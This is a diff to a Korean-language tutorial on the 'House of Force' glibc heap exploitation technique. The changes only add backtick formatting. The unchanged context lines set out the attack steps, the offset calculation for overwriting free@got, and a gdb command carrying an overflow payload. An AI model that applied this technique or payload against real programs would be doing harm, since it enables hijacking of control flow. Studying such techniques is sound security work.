@@ -28,7 +28,7 @@ int main(int argc,char *argv[]){
 }
 ```
 
-일반적으로 heap 영역에 할당되는 0x21000에서 malloc하여 할당된 chunk size를 뺀 값이 top chunk의 크기이다.
+일반적으로 heap 영역에 할당되는 0x21000에서 `malloc()`하여 할당된 chunk size를 뺀 값이 top chunk의 크기이다.
 
 ```
 0x21000 - 0x110(malloc) = 0x20ef0
@@ -54,9 +54,9 @@ top chunk는 재사용 가능한 chunk가 없고, top chunk의 크기가 요청 
 
 1. heap 영역 생성
 2. top chunk 변조
-3. 계산된 값을 malloc 인자 값으로 전달해 메모리를 할당
+3. 계산된 값을 `malloc()` 인자 값으로 전달해 메모리를 할당
     - target address - allocated chunk header size(16 or 8) - top chunk address
-4. 다시 malloc 호출
+4. 다시 `malloc()` 호출
     - 공격자가 원하는 영역이 할당됨
 
 ## Proof of concept
@@ -127,9 +127,9 @@ gdb-peda$ heapinfo
             unsortbin: 0x0
 ```
 
-"free@got(0x601018)" - "Chunk header size(0x10)" - "Top chunk address(0x602118)" - 0x8 = 0xffffeee8
+`free@got(0x601018)` - `Chunk header size(0x10)` - `Top chunk address(0x602118)` - 0x8 = 0xffffeee8
 
-heap 영역은 0x*0 단위로 할당하기 때문에 -0x8을 하였다. argv2에 0xffffeee8을 입력하여 해당 크기만큼 malloc을 해준다. argv3에 BBBBBBBBCCCCCCCC를 입력하면 free@got가 변조된다.
+heap 영역은 0x*0 단위로 할당하기 때문에 -0x8을 하였다. `argv2`에 0xffffeee8을 입력하여 해당 크기만큼 `malloc()`을 해준다. `argv3`에 BBBBBBBBCCCCCCCC를 입력하면 `free@got`가 변조된다.
 
 ```
 gdb-peda$ r $(python -c 'print "A"*0x108+"\xff"*8') 0xffffffffffffeee8 BBBBBBBBCCCCCCCC
